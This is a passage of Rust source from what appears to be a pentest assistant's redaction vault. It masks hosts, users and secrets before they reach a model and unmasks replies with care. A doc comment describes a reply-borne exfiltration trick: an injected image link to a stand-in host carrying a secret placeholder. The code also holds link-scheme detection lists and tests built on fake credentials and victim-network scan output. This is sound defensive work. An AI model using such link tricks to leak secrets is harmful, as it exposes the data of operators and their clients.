                .parse::<IpAddr>()
            {
                Ok(_) => {
                    self.register(
                        Kind::Host,
                        host.address.split('%').next().unwrap_or(&host.address),
                    );
                }
                Err(_) => domain(self, &host.address),
            }
            for name in &host.hostnames {
                domain(self, name);
            }
            for port in host.ports.values() {
                for san in &port.tls_sans {
                    domain(self, san);
                }
                if let Some(host_or_ip) = port
                    .http
                    .as_ref()
                    .and_then(|http| http.location.as_deref())
                    .and_then(extract_redirect_host)
                {
                    match host_or_ip.parse::<IpAddr>() {
                        Ok(_) => {
                            self.register(Kind::Host, &host_or_ip);
                        }
                        Err(_) => domain(self, &host_or_ip),
                    }
                }
            }
            if let Some(mac) = &host.mac {
                self.register(Kind::Host, mac);
            }
        }
        let local = &graph.local;
        let addresses = local
            .interfaces
            .iter()
            .flat_map(|i| i.addresses.iter().map(|a| a.split('/').next().unwrap_or(a)))
            .chain(local.routes.iter().filter_map(|r| r.gateway.as_deref()))
            .chain(local.neighbors.iter().map(|n| n.address.as_str()));
        for address in addresses.map(str::to_owned).collect::<Vec<_>>() {
            self.register(Kind::Host, &address);
        }
    }

    /// Registers the operator's own login name, which turns up in prompts,
    /// paths and tool output. Kept apart from [`Vault::register_graph`] so
    /// that what the graph yields does not depend on who runs meow.
    pub fn register_operator(&mut self) {
        for user in ["USER", "USERNAME", "LOGNAME"]
            .iter()
            .filter_map(|key| std::env::var(key).ok())
        {
            if user.len() >= 3 && user != "root" {
                self.register(Kind::User, &user);
            }
        }
    }

    fn is_internal_name(&self, name: &str) -> bool {
        let name = name.to_ascii_lowercase();
        if self.tokens.contains_key(&(Kind::Dom, name.clone())) {
            return true;
        }
        let tld = name.rsplit('.').next().unwrap_or("");
        INTERNAL_TLDS.contains(&tld)
            || self
                .suffixes
                .iter()
                .any(|suffix| name == *suffix || name.ends_with(&format!(".{suffix}")))
    }

    /// Whether the host-name-shaped text at `text[start..end]` is masked: a
    /// name the graph knows or an internal one, and otherwise any name under
    /// a real top-level domain. Scanned text names machines the graph has
    /// never seen (`FQDN: FILESRV01.ad.example-corp.com` in a script's
    /// output), and a public name identifies whose network this is. Left
    /// alone: the sites of software makers and advisory databases, file
    /// names, and a name that is one part of a path.
    fn is_masked_name(&self, text: &str, start: usize, end: usize) -> bool {
        let name = text[start..end].to_ascii_lowercase();
        if self.is_internal_name(&name) {
            return true;
        }
        let labels: Vec<&str> = name.split('.').collect();
        let tld = labels.last().copied().unwrap_or("");
        if !PUBLIC_TLDS.contains(&tld) || !tld.bytes().all(|b| b.is_ascii_lowercase()) {
            return false;
        }
        if labels.len() == 2 && FILE_LIKE_TLDS.contains(&tld) {
            return false;
        }
        if PUBLIC_NAMES
            .iter()
            .any(|public| name == *public || name.ends_with(&format!(".{public}")))
        {
            return false;
        }
        // `/cgi-bin/status.pl`: after one slash it is a file in a path;
        // after two (`https://name/`) it is the host.
        let before = &text.as_bytes()[..start];
        let in_path = before.ends_with(b"/") && !before.ends_with(b"//");
        !in_path
    }

    /// Finds every sensitive span in `text`: (start, end, kind).
    fn detect(&self, text: &str) -> Vec<(usize, usize, Kind)> {
        let mut spans: Vec<(usize, usize, Kind)> = Vec::new();
        let whole = |regex: &Regex, kind: Kind, spans: &mut Vec<(usize, usize, Kind)>| {
            for found in regex.find_iter(text) {
                spans.push((found.start(), found.end(), kind));
            }
        };
        let group =
            |regex: &Regex, index: usize, kind: Kind, spans: &mut Vec<(usize, usize, Kind)>| {
                for found in regex.captures_iter(text) {
                    if let Some(part) = found.get(index) {
                        spans.push((part.start(), part.end(), kind));
                    }
                }
            };

        whole(&TOKEN, Kind::Lit, &mut spans);
        whole(&PRIVATE_KEY, Kind::Sec, &mut spans);
        whole(&JWT, Kind::Sec, &mut spans);
        whole(&KNOWN_KEY, Kind::Sec, &mut spans);
        whole(&CRYPT_HASH, Kind::Sec, &mut spans);
        whole(&UUID, Kind::Sec, &mut spans);
        group(&AUTH_HEADER, 1, Kind::Sec, &mut spans);
        group(&AUTH_HEADER, 2, Kind::Sec, &mut spans);
        group(&COOKIE, 1, Kind::Sec, &mut spans);
        group(&URL_SECRET, 1, Kind::Sec, &mut spans);
        // The value is quoted with ", with ' or not at all.
        for regex in [&*KEY_VALUE, &*KEY_VALUE_CAMEL] {
            for index in 1..=3 {
                group(regex, index, Kind::Sec, &mut spans);
            }
        }
        group(&URL_CREDENTIALS, 1, Kind::User, &mut spans);
        group(&URL_CREDENTIALS, 2, Kind::Sec, &mut spans);
        for found in BLOB.find_iter(text) {
            if is_base64_credentials(found.as_str()) || is_high_entropy(found.as_str()) {
                spans.push((found.start(), found.end(), Kind::Sec));
            }
        }

        whole(&MAC, Kind::Host, &mut spans);
        for found in IPV4.find_iter(text) {
            if is_dotted_quad(found.as_str()) {
                spans.push((found.start(), found.end(), Kind::Host));
            }
        }
        for found in IPV6_RUN.find_iter(text) {
            if let Some((start, end)) = ipv6_span(text, found.start(), found.end(), &self.tokens) {
                spans.push((start, end, Kind::Host));
            }
        }
        for found in HOSTNAME.find_iter(text) {
            if self.is_masked_name(text, found.start(), found.end()) {
                spans.push((found.start(), found.end(), Kind::Dom));
            }
        }
        for found in NAMED_HOST.captures_iter(text) {
            let part = found.get(1).expect("group 1 always participates");
            let value = part.as_str().trim_end_matches('.');
            if value.contains('.') || is_single_label_name(value) {
                spans.push((part.start(), part.start() + value.len(), Kind::Dom));
            }
        }
        for found in NAMED_USER.captures_iter(text) {
            let part = found.get(1).expect("group 1 always participates");
            let value = part.as_str().trim_end_matches('.');
            if !COMMON_USERS.contains(&value.to_ascii_lowercase().as_str()) {
                spans.push((part.start(), part.start() + value.len(), Kind::User));
            }
        }
        whole(&FS_PATH, Kind::Path, &mut spans);
        group(&EMAIL_USER, 1, Kind::User, &mut spans);
        // Registered values that no pattern above would recognise (single
        // label host names, user names), looked up by the word they begin
        // with at every place a word begins.
        if !self.by_first_word.is_empty() {
            let lower = text.to_ascii_lowercase();
            let bytes = lower.as_bytes();
            let in_word = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
            let mut at = 0;
            while at < bytes.len() {
                if !in_word(bytes[at]) || (at > 0 && in_word(bytes[at - 1])) {
                    at += 1;
                    continue;
                }
                let word_end = at + bytes[at..].iter().take_while(|b| in_word(**b)).count();
                if let Some(candidates) = self.by_first_word.get(&lower[at..word_end]) {
                    for (kind, needle) in candidates {
                        let end = at + needle.len();
                        if lower[at..].starts_with(needle.as_str())
                            && !bytes.get(end).is_some_and(|b| in_word(*b))
                        {
                            spans.push((at, end, *kind));
                        }
                    }
                }
                at = word_end;
            }
        }
        spans
    }

    /// Registers the names a text introduces as such (`Computer name: X`,
    /// `user=Y`), so that the same name is masked wherever else it stands,
    /// also in a string that is masked before this one.
    fn learn(&mut self, text: &str) {
        for regex in [&*NAMED_HOST, &*NAMED_USER] {
            let user = std::ptr::eq(regex, &*NAMED_USER);
            let found: Vec<String> = regex
                .captures_iter(text)
                .filter_map(|c| c.get(1))
                .map(|part| part.as_str().trim_end_matches('.').to_owned())
                .collect();
            for value in found {
                if user {
                    if !COMMON_USERS.contains(&value.to_ascii_lowercase().as_str()) {
                        self.register(Kind::User, &value);
                    }
                } else if value.contains('.') {
                    self.register(Kind::Dom, &value);
                    // host.ad.example.com -> every name under ad.example.com.
                    // corp.co.uk -> parent co.uk is a public suffix, so register corp.co.uk itself.
                    let labels: Vec<&str> = value.split('.').collect();
                    if labels.len() >= 3 {
                        let parent = labels[1..].join(".");
                        if is_public_multi_label_suffix(&parent) {
                            self.register_domain_suffix(&value);
                        } else {
                            self.register_domain_suffix(&parent);
                        }
                    } else if labels.len() == 2 {
                        self.register_domain_suffix(&value);
                    }
                } else if is_single_label_name(&value) {
                    self.register(Kind::Dom, &value);
                }
            }
        }
    }

    fn learn_json(&mut self, value: &Value) {
        match value {
            Value::String(text) => self.learn(text),
            Value::Array(items) => items.iter().for_each(|item| self.learn_json(item)),
            Value::Object(map) => map.values().for_each(|item| self.learn_json(item)),
            _ => {}
        }
    }

    /// Replaces every sensitive value in `text` by its placeholder.
    pub fn mask_text(&mut self, text: &str) -> String {
        self.learn(text);
        self.mask_text_learned(text)
    }

    fn mask_text_learned(&mut self, text: &str) -> String {
        let mut spans: Vec<(usize, usize, Kind)> = self
            .detect(text)
            .into_iter()
            .filter(|span| text.is_char_boundary(span.0) && text.is_char_boundary(span.1))
            .collect();
        // Spans that overlap are masked as one, from the first start to the
        // last end: dropping the shorter one would leave its other half in
        // clear (`::ffff:10.0.0.5`). A secret anywhere makes it a secret.
        spans.sort_by_key(|span| (span.0, std::cmp::Reverse(span.1)));
        let rank = |kind: Kind| match kind {
            Kind::Sec => 5,
            Kind::Host => 4,
            Kind::Path => 3,
            Kind::Dom => 2,
            Kind::User => 1,
            Kind::Lit => 0,
        };
        let mut chosen: Vec<(usize, usize, Kind)> = Vec::new();
        for span in spans {
            match chosen.last_mut() {
                Some(last) if span.0 < last.1 => {
                    // The longer of the two names the kind, a secret always.
                    let longer = (span.1 - span.0) > (last.1 - last.0);
                    if span.2 == Kind::Sec
                        || (last.2 != Kind::Sec
                            && (longer
                                || (span.1 - span.0 == last.1 - last.0
                                    && rank(span.2) > rank(last.2))))
                    {
                        last.2 = span.2;
                    }
                    last.1 = last.1.max(span.1);
                }
                _ => chosen.push(span),
            }
        }
        let mut out = String::with_capacity(text.len());
        let mut last = 0;
        for (start, end, kind) in chosen {
            out.push_str(&text[last..start]);
            out.push_str(&self.register(kind, &text[start..end]));
            last = end;
        }
        out.push_str(&text[last..]);
        out
    }

    /// Masks the string values of a JSON document. Keys, numbers and the
    /// structure are left alone, so the result is still the same document.
    pub fn mask_json(&mut self, value: &Value) -> Value {
        self.learn_json(value);
        self.mask_json_values(value)
    }

    fn mask_json_values(&mut self, value: &Value) -> Value {
        match value {
            Value::String(text) => Value::String(self.mask_text_learned(text)),
            Value::Array(items) => Value::Array(
                items
                    .iter()
                    .map(|item| self.mask_json_values(item))
                    .collect(),
            ),
            Value::Object(map) => Value::Object(
                map.iter()
                    .map(|(key, item)| (key.clone(), self.mask_json_values(item)))
                    .collect(),
            ),
            other => other.clone(),
        }
    }

    /// Puts the real values back. Unknown placeholders are left as they are.
    pub fn unmask(&self, text: &str) -> String {
        TOKEN
            .replace_all(text, |found: &regex::Captures| {
                match self.entries.get(&found[0]) {
                    Some(entry) => entry.value.clone(),
                    None => found[0].to_owned(),
                }
            })
            .into_owned()
    }

    /// Kinds of sensitive values still present in `text` after masking
    /// (`HOST`, `SEC`, ...). Used as a last check before a request leaves
    /// the machine: anything found here means the request must not be sent.
    pub fn leaks(&self, text: &str) -> Vec<String> {
        // A placeholder where a value was (`password="<<SEC_01>>"`) is what
        // masking leaves behind, not a leak: a span counts only when it
        // holds a letter or digit outside placeholders.
        let holds_text = |start: usize, end: usize| {
            TOKEN
                .replace_all(&text[start..end], "")
                .chars()
                .any(|c| c.is_alphanumeric())
        };
        let mut found: Vec<String> = self
            .detect(text)
            .into_iter()
            .filter(|(start, end, kind)| {
                *kind != Kind::Lit
                    && text.is_char_boundary(*start)
                    && text.is_char_boundary(*end)
                    && holds_text(*start, *end)
            })
            .map(|(_, _, kind)| kind.tag().to_owned())
            .collect();
        found.sort();
        found.dedup();
        found
    }

    /// [`Vault::leaks`] for the string values of a JSON document, each on
    /// its own, as they were masked. The keys are the request's own words,
    /// and the document's text has escapes in it that no value holds.
    pub fn leaks_json(&self, value: &Value) -> Vec<String> {
        fn walk(vault: &Vault, value: &Value, found: &mut Vec<String>) {
            match value {
                Value::String(text) => found.extend(vault.leaks(text)),
                Value::Array(items) => items.iter().for_each(|item| walk(vault, item, found)),
                Value::Object(map) => map.values().for_each(|item| walk(vault, item, found)),
                _ => {}
            }
        }
        let mut found = Vec::new();
        walk(self, value, &mut found);
        found.sort();
        found.dedup();
        found
    }

    /// Secrets seen so far, for the "rotate these" list. Values are never
    /// returned, only a redacted hint.
    pub fn exposed_secrets(&self) -> Vec<ExposedSecret> {
        let mut secrets: Vec<ExposedSecret> = self
            .entries
            .iter()
            .filter(|(_, entry)| entry.kind == Kind::Sec)
            .map(|(token, entry)| ExposedSecret {
                token: token.clone(),
                preview: preview(&entry.value),
                first_seen_utc: entry.first_seen_utc.clone(),
            })
            .collect();
        secrets.sort_by(|a, b| a.token.cmp(&b.token));
        secrets
    }

    pub fn len(&self) -> usize {
        self.entries.len()
    }

    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// An unmasker for the reply to `request`, which arrives in pieces. It
    /// owns a copy of the placeholders, so it can outlive a lock on the
    /// vault: of those that `request` contains, and no others. A reply that
    /// names a placeholder it was never sent (they are numbered, so easy to
    /// guess) gets that text back as it is, not a value from another host.
    pub fn stream_for(&self, request: &str) -> StreamUnmasker {
        StreamUnmasker {
            values: TOKEN
                .find_iter(request)
                .filter_map(|found| {
                    let entry = self.entries.get(found.as_str())?;
                    Some((found.as_str().to_owned(), entry.value.clone()))
                })
                .collect(),
            held: String::new(),
            in_external_word: false,
            word_tail: String::new(),
            md_link_parens: 0,
            in_html_tag: false,
            html_quote: None,
            at_line_start: true,
            in_ref_label: false,
            in_ref_def: false,
        }
    }
}

/// The longest run without a space that is looked at as one word.
const MAX_WORD: usize = 4096;

const LINK_MARKERS: &[&str] = &[
    "//",
    "](",
    "]:",
    "www.",
    "http:",
    "https:",
    "ftp:",
    "ws:",
    "wss:",
    "mailto:",
    "data:",
    "javascript:",
    "vbscript:",
    "blob:",
    "file:",
    "src=",
    "href=",
    "srcset=",
    "formaction=",
    "url(",
];

/// Unmasks streamed text, a whole word at a time: whether a placeholder is
/// filled in depends on the rest of its word and surrounding Markdown/HTML
/// link state.
///
/// A reply is written by a model, and partly by whatever the model read. If
/// it says `![x](https://elsewhere.example/p.png?v=<<SEC_01>>)`, filling in
/// the placeholder would put the real secret into an address that a viewer
/// of the saved reply fetches. So inside a link, image, reference definition
/// or HTML tag a placeholder stays as it is, unless the link goes directly
/// to the placeholder itself (`https://<<HOST_01>>/admin`): that is the
/// user's own target.
pub struct StreamUnmasker {
    values: HashMap<String, String>,
    held: String,
    in_external_word: bool,
    word_tail: String,
    md_link_parens: usize,
    in_html_tag: bool,
    html_quote: Option<u8>,
    at_line_start: bool,
    in_ref_label: bool,
    in_ref_def: bool,
}

impl StreamUnmasker {
    fn fill(&self, text: &str) -> String {
        TOKEN
            .replace_all(text, |found: &regex::Captures| {
                match self.values.get(&found[0]) {
                    Some(value) => value.clone(),
                    None => found[0].to_owned(),
                }
            })
            .into_owned()
    }

    /// Whether `word` is a standalone `http(s)://` link to a `HOST` or `DOM`
    /// placeholder of this request, with no Markdown image (`![`), no scheme
    /// prefix before `http(s)://`, no userinfo/subdomain/double-dot in the
    /// authority, and no second piggybacked link or HTML tag in the same word.
    fn links_to_own_host(&self, word: &str) -> bool {
        let trimmed = word.trim_end_matches(char::is_whitespace);
        let Some(scheme_end) = trimmed.find("://") else {
            return false;
        };
        let before = &trimmed[..scheme_end];
        let scheme = if let Some(after_md) = before.strip_prefix('[').and_then(|s| {
            let (label, rest) = s.split_once("](")?;
            (!label.contains(['[', ']', '<', ':']) && !label.contains("//")).then_some(rest)
        }) {
            after_md.trim_start_matches('<')
        } else {
            before.trim_start_matches(['(', '<', '"', '\''])
        };
        if !scheme.eq_ignore_ascii_case("http") && !scheme.eq_ignore_ascii_case("https") {
            return false;
        }

        let rest = &trimmed[scheme_end + 3..];
        let rest_stripped = TOKEN.replace_all(rest, "T");
        if rest_stripped.contains("://")
            || rest_stripped.contains("//")
            || rest_stripped.contains("](")
            || rest_stripped.contains('<')
        {
            return false;
        }

        let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
        let authority_raw = &rest[..authority_end];
        let authority = if authority_end == rest.len() {
            authority_raw.trim_end_matches(['.', ',', ';', ')', '>', '\'', '"'])
        } else {
            authority_raw
        };

        let (token_str, after_host) = if let Some(inner) = authority.strip_prefix('[') {
            let Some(token) = TOKEN.find(inner).filter(|m| m.start() == 0) else {
                return false;
            };
            let Some(after_bracket) = inner[token.end()..].strip_prefix(']') else {
                return false;
            };
            (token.as_str(), after_bracket)
        } else {
            let Some(token) = TOKEN.find(authority).filter(|m| m.start() == 0) else {
                return false;
            };
            (token.as_str(), &authority[token.end()..])
        };

        let known = self.values.contains_key(token_str)
            && (token_str.starts_with("<<HOST_") || token_str.starts_with("<<DOM_"));
        if !known {
            return false;
        }

        if after_host.is_empty() {
            true
        } else if let Some(port) = after_host.strip_prefix(':') {
            !port.is_empty()
                && port.bytes().all(|b| b.is_ascii_digit())
                && port.parse::<u16>().is_ok_and(|p| p > 0)
        } else {
            false
        }
    }

    fn word(&mut self, word: &str) -> String {
        if word.is_empty() {
            return String::new();
        }
        let ends_ws = word.ends_with(char::is_whitespace);
        let core = word.trim_end_matches(char::is_whitespace);
        let trailing_ws = &word[core.len()..];

        if core.is_empty() {
            self.in_external_word = false;
            self.word_tail.clear();
            if trailing_ws.contains('\n') {
                if self.at_line_start {
                    self.md_link_parens = 0;
                    self.in_html_tag = false;
                    self.html_quote = None;
                }
                self.in_ref_def = false;
                self.in_ref_label = false;
                self.at_line_start = true;
            }
            return word.to_owned();
        }

        let stripped = TOKEN.replace_all(core, "T");

        if self.word_tail.is_empty() {
            if self.at_line_start {
                if stripped.starts_with('[') && !stripped.starts_with("![") {
                    if stripped.ends_with("]:") {
                        self.in_ref_def = true;
                    } else if !stripped.contains(']') {
                        self.in_ref_label = true;
                    }
                }
                self.at_line_start = false;
            } else if self.in_ref_label {
                if stripped.ends_with("]:") {
                    self.in_ref_label = false;
                    self.in_ref_def = true;
                } else if stripped.contains(']') {
                    self.in_ref_label = false;
                }
            }
        }
        let word_in_ref = self.in_ref_def;

        let mut word_in_md_dest = self.md_link_parens > 0;
        let sbytes = stripped.as_bytes();
        let mut idx = 0;
        while idx < sbytes.len() {
            if sbytes[idx] == b'\\' {
                idx += 2;
                continue;
            }
            if self.md_link_parens > 0 {
                if sbytes[idx] == b'(' {
                    self.md_link_parens += 1;
                } else if sbytes[idx] == b')' {
                    self.md_link_parens -= 1;
                }
            } else if idx + 1 < sbytes.len() && sbytes[idx] == b']' && sbytes[idx + 1] == b'(' {
                self.md_link_parens = 1;
                word_in_md_dest = true;
                idx += 2;
                continue;
            }
            idx += 1;
        }

        let was_in_html_tag = self.in_html_tag;
        let mut word_in_html = self.in_html_tag;
        let mut j = 0;
        while j < sbytes.len() {
            let b = sbytes[j];
            if self.in_html_tag {
                if let Some(q) = self.html_quote {
                    if b == q {
                        self.html_quote = None;
                    }
                } else if b == b'"' || b == b'\'' {
                    self.html_quote = Some(b);
                } else if b == b'>' {
                    self.in_html_tag = false;
                }
            } else if b == b'<'
                && sbytes
                    .get(j + 1)
                    .is_some_and(|next| next.is_ascii_alphabetic())
            {
                self.in_html_tag = true;
                word_in_html = true;
            }
            j += 1;
        }

        let lower = core.to_ascii_lowercase();
        let combined = if self.word_tail.is_empty() {
            std::borrow::Cow::Borrowed(lower.as_str())
        } else {
            std::borrow::Cow::Owned(format!("{}{lower}", self.word_tail))
        };
        let in_link = LINK_MARKERS.iter().any(|mark| combined.contains(mark));
        let allow_own_host =
            self.word_tail.is_empty() && !was_in_html_tag && self.links_to_own_host(core);
        let blocked = self.in_external_word
            || ((in_link || word_in_md_dest || word_in_ref || word_in_html) && !allow_own_host);

        if ends_ws {
            self.in_external_word = false;
            self.word_tail.clear();
            if trailing_ws.contains('\n') {
                self.in_ref_def = false;
                self.in_ref_label = false;
                self.at_line_start = true;
                if trailing_ws.matches('\n').count() >= 2 {
                    self.md_link_parens = 0;
                    self.in_html_tag = false;
                    self.html_quote = None;
                }
            }
        } else {
            if blocked {
                self.in_external_word = true;
            }
            let tail_start = combined
                .char_indices()
                .rev()
                .nth(20)
                .map_or(0, |(pos, _)| pos);
            self.word_tail = combined[tail_start..].to_owned();
        }

        if !core.contains("<<") || blocked {
            word.to_owned()
        } else {
            format!("{}{trailing_ws}", self.fill(core))
        }
    }

    fn words(&mut self, text: &str) -> String {
        text.split_inclusive(char::is_whitespace)
            .map(|word| self.word(word))
            .collect()
    }

    /// Adds a chunk and returns the text that is safe to show now: all of
    /// it up to the last space.
    pub fn push(&mut self, chunk: &str) -> String {
        self.held.push_str(chunk);
        let cut = match self.held.rfind(char::is_whitespace) {
            Some(at) => at + self.held[at..].chars().next().map_or(1, char::len_utf8),
            // A run this long without a space is not prose; let it go, but
            // not through the middle of a placeholder.
            None if self.held.len() > MAX_WORD => match self.held.rfind("<<") {
                Some(start)
                    if !self.held[start..].contains(">>")
                        && self.held.len() - start <= MAX_TOKEN_LEN =>
                {
                    start
                }
                _ if self.held.ends_with('<') => self.held.len() - 1,
                _ => self.held.len(),
            },
            None => 0,
        };
        let ready: String = self.held.drain(..cut).collect();
        self.words(&ready)
    }

    /// Returns whatever is still held back, at the end of the stream.
    pub fn finish(&mut self) -> String {
        let rest = std::mem::take(&mut self.held);
        self.words(&rest)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evidence::{Confidence, EvidenceRecord, Source};
    use crate::graph::Observation;
    use serde_json::json;

    fn vault_with_lab() -> Vault {
        let mut graph = Graph::default();
        graph.apply(Observation::Port {
            address: "10.10.10.5".into(),
            port: 443,
            protocol: "tcp".into(),
            state: "open".into(),
            service: Some("https".into()),
            product: Some("nginx".into()),
            version: Some("1.18.0".into()),
            extra_info: None,
            cpes: vec![],
            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
        });
        for san in ["app.corp-acme.com", "*.corp-acme.com"] {
            graph.apply(Observation::TlsSan {
                address: "10.10.10.5".into(),
                port: 443,
                san: san.into(),
                record: EvidenceRecord::observed(Source::TlsSan, Confidence::High, "x"),
            });
        }
        graph.apply(Observation::Hostname {
            address: "10.10.10.5".into(),
            hostname: "dc01".into(),
            record: EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x"),
        });
        let mut vault = Vault::ephemeral();
        vault.register_graph(&graph);
        vault
    }

    #[test]
    fn hosts_names_and_paths_become_stable_placeholders() {
        let mut vault = vault_with_lab();
        let text = "GET https://APP.corp-acme.com/portal/ on 10.10.10.5 and [2001:db8::a]:8443, \
                    db.corp-acme.com too; dc01 answered; config in /var/www/portal/config.php and \
                    C:\\Users\\alice\\Desktop\\notes.txt; nginx 1.18.0 from nginx.org at 09:41:00";
        let masked = vault.mask_text(text);
        assert_eq!(
            masked,
            "GET https://<<DOM_01>>/portal/ on <<HOST_01>> and [<<HOST_02>>]:8443, \
             <<DOM_04>> too; <<DOM_02>> answered; config in <<PATH_01>> and \
             <<PATH_02>>; nginx 1.18.0 from nginx.org at 09:41:00"
        );
        // Deterministic: the same values map to the same placeholders again.
        assert_eq!(vault.mask_text(text), masked);
        assert_eq!(vault.mask_text("retry 10.10.10.5"), "retry <<HOST_01>>");
        // Unmasking restores the values (names in canonical lower case).
        assert_eq!(
            vault.unmask(&masked),
            text.replace("APP.corp-acme.com", "app.corp-acme.com")
        );
        assert!(vault.leaks(&masked).is_empty());
        assert_eq!(
            vault.leaks("see 10.10.10.5 as alice@corp-acme.com"),
            ["DOM", "HOST", "USER"]
        );
    }

    #[test]
    fn public_software_identifiers_are_left_alone() {
        let mut vault = vault_with_lab();
        for public in [
            "CVE-2021-23017 affects nginx 1.18.0 (cpe:2.3:a:nginx:nginx:1.18.0:*:*:*:*:*:*:*)",
            "OpenSSH_8.2p1 Ubuntu-4ubuntu0.5, OpenSSL 1.1.1f  31 Mar 2020",
            "jquery-3.4.1.min.js and bootstrap.bundle.min.js from /static/js/",
            "HTTP/1.1 403 Forbidden; Server: Apache/2.4.41 (Ubuntu)",
            "GHSA-gxr4-xjj5-5px2 in pkg:npm/lodash@4.17.20",
            "see https://nvd.nist.gov/vuln/detail/CVE-2021-23017",
        ] {
            assert_eq!(vault.mask_text(public), public);
        }
    }

    #[test]
    fn secrets_are_masked_and_flagged_for_rotation() {
        let mut vault = Vault::ephemeral();
        let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let cases = [
            (
                "Authorization: Bearer abc.def-ghi_123",
                "Authorization: Bearer <<SEC_01>>",
            ),
            (
                "authorization=Basic YWRtaW46aHVudGVyMg==",
                "authorization=Basic <<SEC_02>>",
            ),
            ("Cookie: PHPSESSID=9f2c1a; theme=dark", "Cookie: <<SEC_03>>"),
            (
                "curl -u x 'http://admin:S3cr3t!@intranet.example/'",
                "curl -u x 'http://<<USER_01>>:<<SEC_04>>@<<DOM_01>>/'",
            ),
            (
                "login?user=bob&password=hunter2&next=/",
                "login?user=<<USER_02>>&password=<<SEC_05>>&next=/",
            ),
            (
                "api_key: \"sk_live_4eC39HqLyjWDarjtT1zdp7dc\"",
                "api_key: \"<<SEC_06>>\"",
            ),
            ("aws AKIAIOSFODNN7EXAMPLE key", "aws <<SEC_07>> key"),
            ("blob dXNlcjpwYXNzd29yZDEyMw== end", "blob <<SEC_08>> end"),
            (
                "token 7f3d9a1c5b2e8f4a6d0c9b7e1a3f5d2c8e4b6a0f",
                "token <<SEC_09>>",
            ),
        ];
        for (input, expected) in cases {
            assert_eq!(vault.mask_text(input), expected, "{input}");
        }
        let masked = vault.mask_text(&format!("jwt={jwt};"));
        assert_eq!(masked, "jwt=<<SEC_10>>;");
        let key = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\nAAAAB3NzaC1yc2E=\n-----END OPENSSH PRIVATE KEY-----";
        assert_eq!(
            vault.mask_text(&format!("key:\n{key}\ndone")),
            "key:\n<<SEC_11>>\ndone"
        );

        let exposed = vault.exposed_secrets();
        assert_eq!(exposed.len(), 11);
        assert_eq!(exposed[9].token, "<<SEC_10>>");
        assert_eq!(exposed[9].preview, format!("eyJh... ({} chars)", jwt.len()));
        // Nothing sensitive is in the hints themselves.
        for secret in &exposed {
            assert!(secret.preview.len() < 24, "{}", secret.preview);
        }
        assert_eq!(vault.unmask("use <<SEC_10>>"), format!("use {jwt}"));
    }

    #[test]
    fn names_users_and_address_forms_the_graph_never_saw_are_masked() {
        // What the 2026-11 audit saw arrive at a stand-in cloud in clear:
        // script output about a host the graph knows only by its address.
        let cases: &[(&str, &[&str])] = &[
            (
                "smb-os-discovery: Computer name: filesrv01 NetBIOS computer name: FILESRV01 \
                 Domain name: ad.victim-corp.com FQDN: FILESRV01.ad.victim-corp.com",
                &["filesrv01", "FILESRV01", "victim-corp"],
            ),
            (
                "rdp-ntlm-info: Target_Name: VICTIMCORP NetBIOS_Domain_Name: VICTIMCORP \
                 DNS_Computer_Name: filesrv01.ad.victim-corp.com then VICTIMCORP\\jsmith logged on",
                &["VICTIMCORP", "victim-corp", "filesrv01"],
            ),
            ("smtp-commands: mx1.victim-corp.com Hello", &["victim-corp", "mx1"]),
            ("backup host is nas7.bigbank-internal.com", &["bigbank", "nas7"]),
            ("mail to jane.doe@victim-corp.co.uk", &["jane.doe", "victim-corp"]),
            ("logged in as jsmith, then user=svc_backup and Login: CORP\\j.doe", &["jsmith", "svc_backup", "j.doe"]),
            ("inet6 addr:fe80::1c2d scope link", &["fe80::1c2d"]),
            ("host:2001:db8:77::15 answered", &["2001:db8:77::15", "db8"]),
            ("src:2001:db8::15 dst=::ffff:10.0.0.5", &["2001:db8::15", "10.0.0.5", ".0.0.5"]),
            ("gateway 010.010.010.007 and 0050.56ab.cdef", &["010.010.010.007", "0050.56ab.cdef"]),
            ("fe80::1%eth0 is the router.", &["fe80::1"]),
            (
                "share \\\\FILESRV01\\Finance$\\payroll.xlsx, notes in ~/clients/acme-bank/loot and /Volumes/ACME/dump",
                &["FILESRV01", "Finance", "payroll", "acme-bank", "ACME"],
            ),
        ];
        for (text, private) in cases {
            let mut vault = Vault::ephemeral();
            let masked = vault.mask_text(text);
            for value in *private {
                assert!(
                    !masked.to_lowercase().contains(&value.to_lowercase()),
                    "{value} survived in: {masked}"
                );
            }
            assert!(vault.leaks(&masked).is_empty(), "{masked}");
            assert!(!vault.unmask(&masked).contains("<<"), "{masked}");
        }
        // The real text comes back (an address in its canonical form).
        let mut vault = Vault::ephemeral();
        let text = "inet6 addr:fe80::1c2d and dst=::ffff:10.0.0.5 for user=svc_backup";
        let masked = vault.mask_text(text);
        assert_eq!(
            masked,
            "inet6 addr:<<HOST_01>> and dst=<<HOST_02>> for user=<<USER_01>>"
        );
        assert_eq!(
            vault.unmask(&masked),
            "inet6 addr:fe80::1c2d and dst=10.0.0.5 for user=svc_backup"
        );
        // A name learnt in one string is masked in every other string of
        // the same document, whichever comes first.
        let mut vault = Vault::ephemeral();
        let masked = vault.mask_json(&json!({
            "a": "share on OLDNAS was open",
            "b": "nbstat: NetBIOS_Computer_Name: OLDNAS",
        }));
        assert!(!masked.to_string().contains("OLDNAS"), "{masked}");
    }

    #[test]
    fn code_times_files_and_software_sites_are_not_addresses_or_names() {
        let mut vault = Vault::ephemeral();
        for plain in [
            "use std::net::IpAddr; foo::bar(a::b_c) at 09:41:00",
            "found install.sh, exploit.py and README.md under /cgi-bin/status.pl",
            "GET /vendor/example.com.zip and /static/js/app.min.js",
            "Node.js v14 with Socket.IO and ASP.NET 4.8 behind nginx/1.18.0",
            "fixed in https://httpd.apache.org/security and https://github.com/nginx/nginx/pull/1",
            "User-Agent: curl/8.4.0; owner: root; user=admin; uid=0(root)",
            "org.apache.commons.text.StringSubstitutor and com.fasterxml.jackson.core",
            "version 2.4.41-4ubuntu3.14 (10.2.3 build)",
        ] {
            assert_eq!(vault.mask_text(plain), plain, "{plain}");
        }
        assert_eq!(vault.len(), 0);
    }

    #[test]
